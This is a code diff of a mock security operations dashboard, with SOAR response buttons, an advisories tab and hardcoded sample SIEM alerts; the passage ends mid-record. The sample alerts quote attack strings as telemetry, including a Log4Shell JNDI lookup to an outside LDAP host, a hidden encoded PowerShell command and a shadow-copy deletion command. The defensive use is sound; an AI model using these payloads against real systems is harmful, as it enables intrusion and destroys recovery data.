-                                            <div class="text-warning" id="drawerCve">CVE-0000</div>
-                                        </div>
-                                    </div>
-                                    <div class="mt-2 d-grid">
-                                        <button class="btn btn-sm btn-outline-info mono"
-                                            onclick="copyRawPayloadFromDrawer()">Copy Raw JSON Payload</button>
-                                    </div>
-                                </div>
+                        <!-- Tab 3: CISA KEV Advisories -->
+                        <div id="tab-advisories" class="workspace-tab d-none">
+                            <div class="d-flex justify-content-between align-items-center mb-3">
+                                <h5 class="fw-bold m-0 d-flex align-items-center gap-2">
+                                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                        stroke-width="2">
+                                        <path
+                                            d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" />
+                                        <line x1="12" y1="9" x2="12" y2="13" />
+                                        <line x1="12" y1="17" x2="12.01" y2="17" /></svg>
+                                    Known Exploited Vulnerabilities (KEV)
+                                </h5>
+                                <span class="badge bg-danger-subtle text-danger border border-danger-subtle mono">CISA
+                                    DATASTREAM ACTIVE</span>
                             </div>
-
-                            <!-- SOAR & Playbook Body -->
-                            <div class="flex-grow-1 overflow-auto p-3 d-flex flex-column gap-3">
-
-                                <!-- Automated Response Actions -->
-                                <div>
-                                    <h6 class="text-uppercase text-secondary fw-bold mono mb-2"
-                                        style="font-size: 0.7rem; letter-spacing: 0.05em;">SOAR API Actions</h6>
-                                    <div class="d-grid gap-2">
-                                        <button id="btnIsolateHost"
-                                            class="btn btn-sm btn-outline-danger d-flex align-items-center justify-content-between px-3 py-2"
-                                            onclick="executeSoarAction('ISOLATE_HOST')">
-                                            <span class="mono fw-semibold" id="btnIsolateHostText">Isolate Host via
-                                                EDR</span>
-                                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none"
-                                                stroke="currentColor" stroke-width="2">
-                                                <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
-                                                <path d="M7 11V7a5 5 0 0 1 10 0v4" /></svg>
-                                        </button>
-                                        <button id="btnBlockIp"
-                                            class="btn btn-sm btn-outline-warning d-flex align-items-center justify-content-between px-3 py-2"
-                                            onclick="executeSoarAction('BLOCK_IP')">
-                                            <span class="mono fw-semibold" id="btnBlockIpText">Block IP at Edge
-                                                FW</span>
-                                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none"
-                                                stroke="currentColor" stroke-width="2">
-                                                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
-                                                <line x1="9" y1="9" x2="15" y2="15" />
-                                                <line x1="15" y1="9" x2="9" y2="15" /></svg>
-                                        </button>
-                                        <button id="btnRevokeTokens"
-                                            class="btn btn-sm btn-outline-info d-flex align-items-center justify-content-between px-3 py-2"
-                                            onclick="executeSoarAction('REVOKE_TOKENS')">
-                                            <span class="mono fw-semibold" id="btnRevokeTokensText">Revoke OAuth
-                                                Sessions</span>
-                                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none"
-                                                stroke="currentColor" stroke-width="2">
-                                                <path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
-                                                <circle cx="8.5" cy="7" r="4" />
-                                                <line x1="20" y1="8" x2="20" y2="14" />
-                                                <line x1="23" y1="11" x2="17" y2="11" /></svg>
-                                        </button>
-                                    </div>
-                                </div>
-
-                                <!-- Playbook Checklist -->
-                                <div>
-                                    <h6 class="text-uppercase text-secondary fw-bold mono mb-2"
-                                        style="font-size: 0.7rem; letter-spacing: 0.05em;">Analyst Playbook
-                                        Verification
-                                    </h6>
-                                    <div class="soc-card p-2" id="drawerChecklist">
-                                        <!-- Rendered via JS -->
-                                    </div>
-                                </div>
-
-                                <!-- Active Investigation Log -->
-                                <div class="flex-grow-1 d-flex flex-column">
-                                    <h6 class="text-uppercase text-secondary fw-bold mono mb-2"
-                                        style="font-size: 0.7rem; letter-spacing: 0.05em;">Investigation Timeline
-                                    </h6>
-                                    <div class="flex-grow-1 overflow-auto d-flex flex-column gap-2 mb-2"
-                                        id="drawerNotesList" style="min-height: 100px;">
-                                        <!-- Rendered via JS -->
-                                    </div>
-                                    <div class="input-group">
-                                        <input type="text" id="analystNoteInput"
-                                            class="form-control form-control-sm bg-dark text-light border-secondary mono"
-                                            placeholder="Add investigation note..."
-                                            onkeypress="if(event.key === 'Enter') addAnalystNote()">
-                                        <button class="btn btn-secondary btn-sm mono" onclick="addAnalystNote()">Add
-                                            Note</button>
-                                    </div>
-                                </div>
+                            <p class="text-secondary small mb-4">Latest critical vulnerabilities being actively
+                                exploited in the wild. Use the sweep function to hunt for historical indicators
+                                across the local SIEM data lake.</p>
+                            <div class="row g-3" id="advisoriesGrid">
+                                <!-- Rendered via JS -->
                             </div>
-
-                            <!-- SOAR Terminal -->
-                            <div class="p-2 border-top"
-                                style="border-color: var(--soc-border) !important; background: var(--soc-bg-surface);">
-                                <div class="d-flex justify-content-between align-items-center px-1 mb-1">
-                                    <span class="mono fw-bold" style="font-size: 0.65rem; color: #64748b;">SOAR
-                                        EXECUTION TERMINAL</span>
-                                    <div class="live-dot" style="width: 6px; height: 6px;"></div>
-                                </div>
-                                <div class="soar-terminal" id="soarTerminal">
-                                    <!-- Rendered via JS -->
-                                </div>
-                            </div>
-                        </aside>
+                        </div>
 
                     </div>
-                </main>
-            </div>
 
-            <!-- Raw Log Modal -->
-            <div class="modal fade" id="rawLogModal" tabindex="-1" aria-hidden="true">
-                <div class="modal-dialog modal-lg modal-dialog-centered modal-dialog-scrollable">
-                    <div class="modal-content"
-                        style="background-color: var(--soc-bg-surface); border: 1px solid var(--soc-border);">
-                        <div class="modal-header border-bottom" style="border-color: var(--soc-border) !important;">
-                            <h5 class="modal-title mono fw-bold text-info d-flex align-items-center gap-2"
-                                id="rawLogModalTitle">
-                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-                                    stroke-width="2">
-                                    <polyline points="4 17 10 11 4 5" />
-                                    <line x1="12" y1="19" x2="20" y2="19" /></svg>
-                                Raw Telemetry
-                            </h5>
-                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"
-                                style="filter: invert(1) grayscale(100%) brightness(200%);"></button>
+                    <!-- RIGHT DRAWER (SOAR Playbook) -->
+                    <aside class="soc-right-drawer collapsed" id="soarDrawer">
+                        <!-- Drawer Header -->
+                        <div class="p-3 border-bottom"
+                            style="border-color: var(--soc-border) !important; background: var(--soc-bg-elevated);">
+                            <div class="d-flex justify-content-between align-items-start mb-2">
+                                <div>
+                                    <span class="mono fw-bold text-info" id="drawerAlertId">ALT-0000</span>
+                                    <span
+                                        class="badge bg-success-subtle text-success border border-success-subtle ms-2 d-none"
+                                        id="drawerContainedBadge">CONTAINED</span>
+                                </div>
+                                <div class="d-flex gap-2">
+                                    <button class="btn btn-sm btn-outline-secondary p-1"
+                                        onclick="exportIncidentMarkdown()" title="Export .MD Report">
+                                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none"
+                                            stroke="currentColor" stroke-width="2">
+                                            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
+                                            <polyline points="7 10 12 15 17 10" />
+                                            <line x1="12" y1="15" x2="12" y2="3" /></svg>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-secondary p-1" onclick="toggleRightDrawer()"
+                                        title="Close Drawer">
+                                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none"
+                                            stroke="currentColor" stroke-width="2">
+                                            <line x1="18" y1="6" x2="6" y2="18" />
+                                            <line x1="6" y1="6" x2="18" y2="18" /></svg>
+                                    </button>
+                                </div>
+                            </div>
+                            <h6 class="fw-bold mb-2" id="drawerAlertTitle"
+                                style="font-size: 0.95rem; line-height: 1.3;">Alert Title</h6>
+                            <div class="d-flex align-items-center gap-2 mb-3">
+                                <span id="drawerSeverityBadge" class="badge-sev">SEV</span>
+                                <div class="dropdown">
+                                    <select
+                                        class="form-select form-select-sm bg-dark text-light border-secondary mono py-0"
+                                        style="font-size: 0.7rem; width: 140px; height: 24px;" id="drawerStatusSelect"
+                                        onchange="updateActiveAlertStatus(this.value)">
+                                        <option value="New">Status: New</option>
+                                        <option value="Investigating">Status: Investigating</option>
+                                        <option value="Contained">Status: Contained</option>
+                                        <option value="False Positive">Status: False Positive</option>
+                                    </select>
+                                </div>
+                                <div class="dropdown">
+                                    <select
+                                        class="form-select form-select-sm bg-dark text-light border-secondary mono py-0"
+                                        style="font-size: 0.7rem; width: 140px; height: 24px;" id="drawerAssigneeSelect"
+                                        onchange="updateActiveAlertAssignee(this.value)">
+                                        <option value="Unassigned">Assign to: Unassigned</option>
+                                        <option value="A. Mercer (T2)">Assign to: A. Mercer</option>
+                                        <option value="M. Patel (IR Lead)">Assign to: M. Patel</option>
+                                        <option value="S. Chen (T3 Threat Hunt)">Assign to: S. Chen</option>
+                                    </select>
+                                </div>
+                            </div>
+
+                            <div class="p-2 rounded bg-dark border border-secondary" style="font-size: 0.75rem;">
+                                <div class="row g-2 mono">
+                                    <div class="col-6">
+                                        <div class="text-secondary" style="font-size: 0.65rem;">Source /
+                                            Attacker IP
+                                        </div>
+                                        <div class="text-warning d-flex align-items-center gap-1 cursor-pointer"
+                                            onclick="pivotiocFromDrawer()" title="Pivot to Threat Intel">
+                                            <span id="drawerSrcIp">0.0.0.0</span>
+                                            <svg width="10" height="10" viewBox="0 0 24 24" fill="none"
+                                                stroke="currentColor" stroke-width="2">
+                                                <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" />
+                                                <polyline points="15 3 21 3 21 9" />
+                                                <line x1="10" y1="14" x2="21" y2="3" /></svg>
+                                        </div>
+                                    </div>
+                                    <div class="col-6">
+                                        <div class="text-secondary" style="font-size: 0.65rem;">Target Endpoint
+                                        </div>
+                                        <div class="text-light fw-bold" id="drawerHostname">HOST</div>
+                                    </div>
+                                    <div class="col-12 mt-1 border-top pt-1 border-secondary">
+                                        <div class="text-secondary" style="font-size: 0.65rem;">MITRE ATT&CK /
+                                            CVE
+                                        </div>
+                                        <div class="text-light text-truncate" id="drawerMitre">T0000</div>
+                                        <div class="text-warning" id="drawerCve">CVE-0000</div>
+                                    </div>
+                                </div>
+                                <div class="mt-2 d-grid">
+                                    <button class="btn btn-sm btn-outline-info mono"
+                                        onclick="copyRawPayloadFromDrawer()">Copy Raw JSON Payload</button>
+                                </div>
+                            </div>
                         </div>
-                        <div class="modal-body p-0" style="background-color: var(--soc-terminal-bg);">
-                            <pre class="m-0 p-3 mono"
-                                style="font-size: 0.8rem; overflow-x: auto;"><code id="rawLogModalBody"></code></pre>
+
+                        <!-- SOAR & Playbook Body -->
+                        <div class="flex-grow-1 overflow-auto p-3 d-flex flex-column gap-3">
+
+                            <!-- Automated Response Actions -->
+                            <div>
+                                <h6 class="text-uppercase text-secondary fw-bold mono mb-2"
+                                    style="font-size: 0.7rem; letter-spacing: 0.05em;">SOAR API Actions</h6>
+                                <div class="d-grid gap-2">
+                                    <button id="btnIsolateHost"
+                                        class="btn btn-sm btn-outline-danger d-flex align-items-center justify-content-between px-3 py-2"
+                                        onclick="executeSoarAction('ISOLATE_HOST')">
+                                        <span class="mono fw-semibold" id="btnIsolateHostText">Isolate Host via
+                                            EDR</span>
+                                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none"
+                                            stroke="currentColor" stroke-width="2">
+                                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
+                                            <path d="M7 11V7a5 5 0 0 1 10 0v4" /></svg>
+                                    </button>
+                                    <button id="btnBlockIp"
+                                        class="btn btn-sm btn-outline-warning d-flex align-items-center justify-content-between px-3 py-2"
+                                        onclick="executeSoarAction('BLOCK_IP')">
+                                        <span class="mono fw-semibold" id="btnBlockIpText">Block IP at Edge
+                                            FW</span>
+                                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none"
+                                            stroke="currentColor" stroke-width="2">
+                                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+                                            <line x1="9" y1="9" x2="15" y2="15" />
+                                            <line x1="15" y1="9" x2="9" y2="15" /></svg>
+                                    </button>
+                                    <button id="btnRevokeTokens"
+                                        class="btn btn-sm btn-outline-info d-flex align-items-center justify-content-between px-3 py-2"
+                                        onclick="executeSoarAction('REVOKE_TOKENS')">
+                                        <span class="mono fw-semibold" id="btnRevokeTokensText">Revoke OAuth
+                                            Sessions</span>
+                                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none"
+                                            stroke="currentColor" stroke-width="2">
+                                            <path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
+                                            <circle cx="8.5" cy="7" r="4" />
+                                            <line x1="20" y1="8" x2="20" y2="14" />
+                                            <line x1="23" y1="11" x2="17" y2="11" /></svg>
+                                    </button>
+                                </div>
+                            </div>
+
+                            <!-- Playbook Checklist -->
+                            <div>
+                                <h6 class="text-uppercase text-secondary fw-bold mono mb-2"
+                                    style="font-size: 0.7rem; letter-spacing: 0.05em;">Analyst Playbook
+                                    Verification
+                                </h6>
+                                <div class="soc-card p-2" id="drawerChecklist">
+                                    <!-- Rendered via JS -->
+                                </div>
+                            </div>
+
+                            <!-- Active Investigation Log -->
+                            <div class="flex-grow-1 d-flex flex-column">
+                                <h6 class="text-uppercase text-secondary fw-bold mono mb-2"
+                                    style="font-size: 0.7rem; letter-spacing: 0.05em;">Investigation Timeline
+                                </h6>
+                                <div class="flex-grow-1 overflow-auto d-flex flex-column gap-2 mb-2"
+                                    id="drawerNotesList" style="min-height: 100px;">
+                                    <!-- Rendered via JS -->
+                                </div>
+                                <div class="input-group">
+                                    <input type="text" id="analystNoteInput"
+                                        class="form-control form-control-sm bg-dark text-light border-secondary mono"
+                                        placeholder="Add investigation note..."
+                                        onkeypress="if(event.key === 'Enter') addAnalystNote()">
+                                    <button class="btn btn-secondary btn-sm mono" onclick="addAnalystNote()">Add
+                                        Note</button>
+                                </div>
+                            </div>
                         </div>
-                        <div class="modal-footer border-top" style="border-color: var(--soc-border) !important;">
-                            <button type="button" class="btn btn-sm btn-outline-secondary mono"
-                                data-bs-dismiss="modal">Close Viewer</button>
-                            <button type="button" class="btn btn-sm btn-info text-dark mono fw-semibold"
-                                id="rawLogModalCopyBtn">Copy Full JSON</button>
+
+                        <!-- SOAR Terminal -->
+                        <div class="p-2 border-top"
+                            style="border-color: var(--soc-border) !important; background: var(--soc-bg-surface);">
+                            <div class="d-flex justify-content-between align-items-center px-1 mb-1">
+                                <span class="mono fw-bold" style="font-size: 0.65rem; color: #64748b;">SOAR
+                                    EXECUTION TERMINAL</span>
+                                <div class="live-dot" style="width: 6px; height: 6px;"></div>
+                            </div>
+                            <div class="soar-terminal" id="soarTerminal">
+                                <!-- Rendered via JS -->
+                            </div>
                         </div>
+                    </aside>
+
+                </div>
+            </main>
+        </div>
+
+        <!-- Raw Log Modal -->
+        <div class="modal fade" id="rawLogModal" tabindex="-1" aria-hidden="true">
+            <div class="modal-dialog modal-lg modal-dialog-centered modal-dialog-scrollable">
+                <div class="modal-content"
+                    style="background-color: var(--soc-bg-surface); border: 1px solid var(--soc-border);">
+                    <div class="modal-header border-bottom" style="border-color: var(--soc-border) !important;">
+                        <h5 class="modal-title mono fw-bold text-info d-flex align-items-center gap-2"
+                            id="rawLogModalTitle">
+                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2">
+                                <polyline points="4 17 10 11 4 5" />
+                                <line x1="12" y1="19" x2="20" y2="19" /></svg>
+                            Raw Telemetry
+                        </h5>
+                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"
+                            style="filter: invert(1) grayscale(100%) brightness(200%);"></button>
+                    </div>
+                    <div class="modal-body p-0" style="background-color: var(--soc-terminal-bg);">
+                        <pre class="m-0 p-3 mono"
+                            style="font-size: 0.8rem; overflow-x: auto;"><code id="rawLogModalBody"></code></pre>
+                    </div>
+                    <div class="modal-footer border-top" style="border-color: var(--soc-border) !important;">
+                        <button type="button" class="btn btn-sm btn-outline-secondary mono"
+                            data-bs-dismiss="modal">Close Viewer</button>
+                        <button type="button" class="btn btn-sm btn-info text-dark mono fw-semibold"
+                            id="rawLogModalCopyBtn">Copy Full JSON</button>
                     </div>
                 </div>
             </div>
+        </div>
 
-            <!-- Toast Notification Container -->
-            <div class="toast-container position-fixed bottom-0 end-0 p-3" style="z-index: 1080;"
-                id="socToastContainer"></div>
+        <!-- Toast Notification Container -->
+        <div class="toast-container position-fixed bottom-0 end-0 p-3" style="z-index: 1080;" id="socToastContainer">
+        </div>
 
-            <!-- Bootstrap 5.3 JS Bundle -->
-            <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+        <!-- Bootstrap 5.3 JS Bundle -->
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
 
-            <script>
-                /********************************************************************
-                 * 1. INITIAL REALISTIC SIEM ALERTS, CTI DB, AND ADVISORY DATA
-                 ********************************************************************/
-                const alertsData = [{
-                        id: "ALT-9402",
-                        timestamp: "11:41:12 UTC",
-                        severity: "Critical",
-                        title: "Cobalt Strike Malleable C2 Beacon Activity",
-                        mitreId: "T1071.001",
-                        mitreName: "Application Layer Protocol: Web",
-                        cve: "N/A (Post-Exploit)",
-                        srcIp: "185.220.101.44",
-                        hostname: "FIN-WKSTN-042",
-                        user: "j.sterling@corp.local",
-                        status: "Investigating",
-                        assignee: "A. Mercer (T2)",
-                        isolated: false,
-                        ipBlocked: false,
-                        tokensRevoked: false,
-                        checklist: [{
-                                text: "Verify anomalous HTTP beacon jitter & malleable URI profile",
-                                done: true
-                            },
-                            {
-                                text: "Inspect parent process tree for rundll32.exe / powershell.exe",
-                                done: true
-                            },
-                            {
-                                text: "Isolate FIN-WKSTN-042 via CrowdStrike Falcon EDR",
-                                done: false
-                            },
-                            {
-                                text: "Block C2 egress IP 185.220.101.44 at perimeter firewall",
-                                done: false
-                            }
-                        ],
-                        notes: [{
-                            ts: "11:41:50 UTC",
-                            author: "A. Mercer (T2)",
-                            text: "Confirmed periodic 60s HTTP POST beacon with 20% jitter to /jquery-3.3.1.min.js."
-                        }],
-                        rawLog: {
-                            cefVersion: "CEF:0|CrowdStrike|FalconHost|7.14|DetectionSummaryEvent|Cobalt Strike C2 Beacon|10|",
-                            src: "185.220.101.44",
-                            dstHost: "FIN-WKSTN-042",
-                            process: "C:\\Windows\\System32\\rundll32.exe",
-                            sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
-                            cmdLine: "rundll32.exe C:\\ProgramData\\update.dll,StartW"
+        <script>
+            /********************************************************************
+             * 1. INITIAL REALISTIC SIEM ALERTS, CTI DB, AND ADVISORY DATA
+             ********************************************************************/
+            const alertsData = [{
+                    id: "ALT-9402",
+                    timestamp: "11:41:12 UTC",
+                    severity: "Critical",
+                    title: "Cobalt Strike Malleable C2 Beacon Activity",
+                    mitreId: "T1071.001",
+                    mitreName: "Application Layer Protocol: Web",
+                    cve: "N/A (Post-Exploit)",
+                    srcIp: "185.220.101.44",
+                    hostname: "FIN-WKSTN-042",
+                    user: "j.sterling@corp.local",
+                    status: "Investigating",
+                    assignee: "A. Mercer (T2)",
+                    isolated: false,
+                    ipBlocked: false,
+                    tokensRevoked: false,
+                    checklist: [{
+                            text: "Verify anomalous HTTP beacon jitter & malleable URI profile",
+                            done: true
+                        },
+                        {
+                            text: "Inspect parent process tree for rundll32.exe / powershell.exe",
+                            done: true
+                        },
+                        {
+                            text: "Isolate FIN-WKSTN-042 via CrowdStrike Falcon EDR",
+                            done: false
+                        },
+                        {
+                            text: "Block C2 egress IP 185.220.101.44 at perimeter firewall",
+                            done: false
                         }
-                    },
-                    {
-                        id: "ALT-9401",
-                        timestamp: "11:36:04 UTC",
-                        severity: "Critical",
-                        title: "Ransomware Volume Shadow Copy Deletion (vssadmin)",
-                        mitreId: "T1490",
-                        mitreName: "Inhibit System Recovery",
-                        cve: "CVE-2024-21412",
-                        srcIp: "10.40.12.91",
-                        hostname: "ERP-SQL-PROD01",
-                        user: "svc_sqlbackup",
-                        status: "New",
-                        assignee: "Unassigned",
-                        isolated: true,
-                        ipBlocked: false,
-                        tokensRevoked: false,
-                        checklist: [{
-                                text: "Confirm vssadmin.exe delete shadows /all /quiet execution",
-                                done: true
-                            },
-                            {
-                                text: "Verify host containment lock on ERP-SQL-PROD01",
-                                done: true
-                            },
-                            {
-                                text: "Revoke svc_sqlbackup Kerberos TGT & active sessions",
-                                done: false
-                            },
-                            {
-                                text: "Trigger immutable SAN snapshot verification",
-                                done: false
-                            }
-                        ],
-                        notes: [{
-                            ts: "11:36:30 UTC",
-                            author: "SOAR Auto-Response",
-                            text: "High-confidence ransomware behavior detected. Host ERP-SQL-PROD01 auto-isolated."
-                        }],
-                        rawLog: {
-                            cefVersion: "CEF:0|Microsoft|DefenderATP|4.18|ProcessCreation|Shadow Copy Deletion|10|",
-                            src: "10.40.12.91",
-                            dstHost: "ERP-SQL-PROD01",
-                            process: "C:\\Windows\\System32\\vssadmin.exe",
-                            cmdLine: "vssadmin.exe delete shadows /all /quiet"
-                        }
-                    },
-                    {
-                        id: "ALT-9398",
-                        timestamp: "11:24:19 UTC",
-                        severity: "High",
-                        title: "Impossible Travel & Evilginx OAuth Token Replay",
-                        mitreId: "T1528",
-                        mitreName: "Steal Application Access Token",
-                        cve: "N/A (Identity)",
-                        srcIp: "91.214.124.88",
-                        hostname: "ENTRA-ID-SSO",
-                        user: "cfo.wilson@corp.local",
-                        status: "New",
-                        assignee: "A. Mercer (T2)",
-                        isolated: false,
-                        ipBlocked: true,
-                        tokensRevoked: false,
-                        checklist: [{
-                                text: "Compare login geo-velocity (London UK -> Novosibirsk RU in 9 mins)",
-                                done: true
-                            },
-                            {
-                                text: "Check session cookie fingerprint for AiTM proxy relay",
-                                done: false
-                            },
-                            {
-                                text: "Revoke Entra ID Refresh Tokens for cfo.wilson@corp.local",
-                                done: false
-                            }
-                        ],
-                        notes: [{
-                            ts: "11:26:10 UTC",
-                            author: "A. Mercer (T2)",
-                            text: "User authenticated via London office IP 51.140.22.10, followed 9 mins later by token replay from ASN 49505."
-                        }],
-                        rawLog: {
-                            cefVersion: "CEF:0|Microsoft|EntraIDIdentityProtection|2.1|UnfamiliarSignIn|AiTM Token Replay|8|",
-                            src: "91.214.124.88",
-                            dstHost: "ENTRA-ID-SSO",
-                            userPrincipalName: "cfo.wilson@corp.local",
-                            appDisplayName: "Microsoft Exchange Online"
-                        }
-                    },
-                    {
-                        id: "ALT-9395",
-                        timestamp: "11:09:47 UTC",
-                        severity: "High",
-                        title: "Suspicious PowerShell EncodedCommand AMSI Bypass",
-                        mitreId: "T1059.001",
-                        mitreName: "Command and Scripting: PowerShell",
-                        cve: "N/A",
-                        srcIp: "10.14.88.204",
-                        hostname: "DEV-BUILD-09",
-                        user: "d.kowalski",
-                        status: "Investigating",
-                        assignee: "S. Chen (T3 Threat Hunt)",
-                        isolated: false,
-                        ipBlocked: false,
-                        tokensRevoked: false,
-                        checklist: [{
-                                text: "Decode Base64 payload from ScriptBlock logging (Event ID 4104)",
-                                done: true
-                            },
-                            {
-                                text: "Check if AmsiUtils.amsiInitFailed reflection succeeded",
-                                done: true
-                            },
-                            {
-                                text: "Isolate DEV-BUILD-09 if outbound cradle connection observed",
-                                done: false
-                            }
-                        ],
-                        notes: [{
-                            ts: "11:14:02 UTC",
-                            author: "S. Chen (T3 Threat Hunt)",
-                            text: "Decoded script attempts reflection on System.Management.Automation.AmsiUtils."
-                        }],
-                        rawLog: {
-                            cefVersion: "CEF:0|Splunk|EnterpriseSecurity|8.2|Event4104|PowerShell EncodedCommand|8|",
-                            src: "10.14.88.204",
-                            dstHost: "DEV-BUILD-09",
-                            process: "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0..."
-                        }
-                    },
-                    {
-                        id: "ALT-9391",
-                        timestamp: "10:52:33 UTC",
-                        severity: "High",
-                        title: "Apache Log4j JNDI LDAP RCE Exploitation Attempt",
-                        mitreId: "T1190",
-                        mitreName: "Exploit Public-Facing Application",
-                        cve: "CVE-2021-44228",
-                        srcIp: "45.155.205.233",
-                        hostname: "DMZ-API-GW02",
-                        user: "anonymous",
-                        status: "Contained",
-                        assignee: "M. Patel (IR Lead)",
-                        isolated: false,
-                        ipBlocked: true,
-                        tokensRevoked: false,
-                        checklist: [{
-                                text: "Inspect WAF payload for ${jndi:ldap://45.155.205.233:1389/a}",
-                                done: true
-                            },
-                            {
-                                text: "Confirm DMZ-API-GW02 runs patched Log4j 2.17.1+",
-                                done: true
-                            },
-                            {
-                                text: "Verify source IP 45.155.205.233 is added to PAN-OS blocklist",
-                                done: true
-                            }
-                        ],
-                        notes: [{
-                            ts: "10:56:00 UTC",
-                            author: "M. Patel (IR Lead)",
-                            text: "WAF blocked request with 403. No egress LDAP callback initiated by DMZ-API-GW02."
-                        }],
-                        rawLog: {
-                            cefVersion: "CEF:0|Cloudflare|WAF|5.0|100512|Log4Shell JNDI Injection|8|",
-                            src: "45.155.205.233",
-                            dstHost: "DMZ-API-GW02",
-                            httpUserAgent: "${jndi:ldap://45.155.205.233:1389/Exploit}"
-                        }
-                    },
-                    {
-                        id: "ALT-9387",
-                        timestamp: "10:31:15 UTC",
-                        severity: "Medium",
-                        title: "Palo Alto PAN-OS GlobalProtect Command Injection Probe",
-                        mitreId: "T1190",
-                        mitreName: "Exploit Public-Facing Application",
-                        cve: "CVE-2024-3400",
-                        srcIp: "193.163.125.77",
-                        hostname: "FW-EDGE-LON01",
-                        user: "system",
-                        status: "Investigating",
-                        assignee: "A. Mercer (T2)",
-                        isolated: false,
-                        ipBlocked: true,
-                        tokensRevoked: false,
-                        checklist: [{
-                                text: "Check SESSID cookie path traversal in GlobalProtect logs",
-                                done: true
-                            },
-                            {
-                                text: "Verify hotfix PAN-OS 11.1.2-h3 is installed on FW-EDGE-LON01",
-                                done: false
-                            }
-                        ],
-                        notes: [{
-                            ts: "10:35:12 UTC",
-                            author: "A. Mercer (T2)",
-                            text: "Observed automated telemetry directory creation attempt via SESSID cookie."
-                        }],
-                        rawLog: {
-                            cefVersion: "CEF:0|PaloAltoNetworks|PAN-OS|11.1|Threat|CVE-2024-3400 Telemetry Exploit|7|",
-                            src: "193.163.125.77",
-                            dstHost: "FW-EDGE-LON01",
-                            uri: "/ssl-vpn/hipreport.esp"
-                        }
-                    },
-                    {
-                        id: "ALT-9380",
-                        timestamp: "10:04:50 UTC",
-                        severity: "Low",
-                        title: "Internal Vulnerability Scanner SMB Enumeration",
-                        mitreId: "T1046",
-                        mitreName: "Network Service Discovery",
-                        cve: "N/A",
-                        srcIp: "10.10.2.50",
-                        hostname: "CORP-DC-01",
-                        user: "svc_nessus",
-                        status: "False Positive",
-                        assignee: "A. Mercer (T2)",
-                        isolated: false,
-                        ipBlocked: false,
-                        tokensRevoked: false,
-                        checklist: [{
-                                text: "Verify source IP 10.10.2.50 against authorized Qualys/Tenable scanner subnet",
-                                done: true
-                            },
-                            {
-                                text: "Close alert as scheduled maintenance scan",
-                                done: true
-                            }
-                        ],
-                        notes: [{
-                            ts: "10:08:00 UTC",
-                            author: "A. Mercer (T2)",
-                            text: "Confirmed authorized weekly Tenable Nessus credentialed scan."
-                        }],
-                        rawLog: {
-                            cefVersion: "CEF:0|Zeek|NetworkMonitor|6.0|SMBScan|Authorized Scanner Traffic|3|",
-                            src: "10.10.2.50",
-                            dstHost: "CORP-DC-01",
-                            service: "microsoft-ds (445/tcp)"
-                        }
+                    ],
+                    notes: [{
+                        ts: "11:41:50 UTC",
+                        author: "A. Mercer (T2)",
+                        text: "Confirmed periodic 60s HTTP POST beacon with 20% jitter to /jquery-3.3.1.min.js."
+                    }],
+                    rawLog: {
+                        cefVersion: "CEF:0|CrowdStrike|FalconHost|7.14|DetectionSummaryEvent|Cobalt Strike C2 Beacon|10|",
+                        src: "185.220.101.44",
+                        dstHost: "FIN-WKSTN-042",
+                        process: "C:\\Windows\\System32\\rundll32.exe",
+                        sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+                        cmdLine: "rundll32.exe C:\\ProgramData\\update.dll,StartW"
                     }
-                ];
-
-                // Threat Intelligence Database for IOC Enrichment
-                const ctiDatabase = {
-                    "185.220.101.44": {
-                        type: "IPv4 Address",
-                        riskScore: 96,
-                        verdict: "MALICIOUS // COBALT STRIKE C2",
-                        vtDetections: "64 / 92 Security Vendors",
-                        abuseConfidence: "100% (412 Reports in 14d)",
-                        asn: "AS205100 (F3 Netze e.V. / Bulletproof Node)",
-                        country: "Germany (DE) — Tor Exit & C2 Relay",
-                        mitre: ["T1071.001 (Web Protocols)", "T1055 (Process Injection)",
-                            "T1105 (Ingress Tool Transfer)"
-                        ],
-                        threatActor: "UNC2452 / FIN7 Infrastructure Overlap",
-                        summary: "Known Cobalt Strike TeamServer listening on ports 443/8443 using a spoofed Cloudflare SSL certificate."
-                    },
-                    "91.214.124.88": {
-                        type: "IPv4 Address",
-                        riskScore: 89,
-                        verdict: "MALICIOUS // EVILGINX AiTM PROXY",
-                        vtDetections: "48 / 92 Security Vendors",
-                        abuseConfidence: "94% (128 Reports)",
-                        asn: "AS49505 (Selectel VDS Network)",
-                        country: "Russian Federation (RU)",
-                        mitre: ["T1528 (Steal Application Access Token)", "T1539 (Steal Web Session Cookie)"],
-                        threatActor: "Midnight Blizzard / AiTM Phishing Cluster",
